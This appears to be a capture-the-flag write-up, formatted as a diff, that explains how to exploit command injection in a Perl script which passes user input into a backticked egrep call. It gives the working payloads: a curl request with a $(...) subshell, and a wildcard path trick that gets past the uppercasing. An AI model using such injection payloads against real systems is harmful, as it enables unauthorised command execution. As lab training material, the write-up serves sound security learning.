@@ -1,0 +1,42 @@
+another perl script
+
+we can see that funtion t use parameters x and y and store it in $nn $xx
+
+$nn is useless
+$xx is use
+
+there is 2 regex right after:
+$xx =~ tr/a-z/A-Z/;   -> min to maj for a-z
+$xx =~ s/\s.*//;      -> remove everything after space
+
+then it store in array output of egrep
+
+@output = `egrep "^$xx" /tmp/xd 2>&1`;
+
+egrep use our variable $xx
+
+so we can pass it another subshell
+
+it should go like this :
+
+curl 10.11.200.126:4646?x='$(/bin/getflag > /tmp/pass)'
+
+but it doesn't work single the regex will uppercase our letter
+
+let's store it in a file so it will replace it only after the regex
+
+chmod +x /tmp/FLAG
+
+cat /tmp/FLAG
+
+#!/bin/bash
+
+/bin/getflag > /tmp/pass
+
+#ifconfig for ip
+
+curl <ip>:4646?x='$(/*/FLAG)'
+
+cat /tmp/pass
+
+
